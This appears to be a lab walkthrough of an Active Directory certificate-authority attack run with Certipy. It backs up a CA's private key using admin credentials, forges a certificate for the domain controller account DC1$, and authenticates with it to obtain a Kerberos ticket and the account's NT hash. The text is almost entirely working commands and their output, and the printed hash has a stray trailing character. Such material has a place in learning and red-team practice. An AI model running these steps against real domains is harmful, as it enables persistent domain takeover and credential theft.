Now lets create a CA backup



certipy-ad ca -backup -u Administrateur -p 'Password123!!' -dc-ip 192.168.10.10 -target DC1.lab.local -ca 'lab-DC1-CA'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Creating new service for backup operation
[*] Creating backup
[*] Retrieving backup
[*] Got certificate and private key
[*] Backing up original PFX/P12 to 'pfx.p12'
[*] Backed up original PFX/P12 to 'pfx.p12'
[*] Saving certificate and private key to 'lab-DC1-CA.pfx'
[*] Wrote certificate and private key to 'lab-DC1-CA.pfx'
[*] Cleaning up

For example I request a certificate for DC1$ to test now:

certipy-ad forge -ca-pfx lab-DC1-CA.pfx -upn 'DC1$'@lab.local -upn 'DC1$'@lab.local 
[*] Saving forged certificate and private key to 'dc1_forged.pfx'
[*] Wrote forged certificate and private key to 'dc1_forged.pfx'

Now I can auth as DC1$ using .ccache or even nthash

certipy-ad auth -pfx 'dc1_forged.pfx' -dc-ip 192.168.10.10


certipy-ad auth -pfx 'dc1_forged.pfx' -dc-ip 192.168.10.10
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'DC1$@lab.local'
[*] Using principal: 'dc1$@lab.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc1.ccache'
[*] Wrote credential cache to 'dc1.ccache'
[*] Trying to retrieve NT hash for 'dc1$'
[*] Got hash for 'dc1$@lab.local': aad3b435b51404eeaad3b435b51404ee:0bfbf877994587ba9f1c9ceef33c8cc3s